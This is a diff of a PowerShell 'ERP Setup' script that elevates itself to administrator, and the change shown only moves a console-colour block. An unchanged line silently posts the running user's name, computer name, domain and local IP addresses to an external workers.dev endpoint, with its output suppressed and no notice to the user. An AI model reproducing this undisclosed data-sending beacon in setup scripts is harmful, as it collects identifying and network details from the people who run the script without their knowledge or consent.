@@ -6,6 +6,16 @@
 # Auto-Elevates to Administrator
 # ============================================================
 # Script Info
+# -----------------------------
+# UI: black background + bright colors
+# -----------------------------
+try {
+    $raw = $Host.UI.RawUI
+    $raw.BackgroundColor = 'Black'
+    $raw.ForegroundColor = 'White'
+    Clear-Host
+} catch {}
+
 $ScriptName = "ERP Setup"
 $Author     = "rhshourav"
 $GitHub     = "https://github.com/rhshourav/Windows-Scripts"
@@ -20,15 +30,6 @@ Write-Host (" Version  : " + $Version)    -ForegroundColor Yellow
 
 $ErrorActionPreference = "Stop"
 Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nERP-Automate`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
-# -----------------------------
-# UI: black background + bright colors
-# -----------------------------
-try {
-    $raw = $Host.UI.RawUI
-    $raw.BackgroundColor = 'Black'
-    $raw.ForegroundColor = 'White'
-    Clear-Host
-} catch {}
 
 # -----------------------------
 # Auto-Elevate to Admin
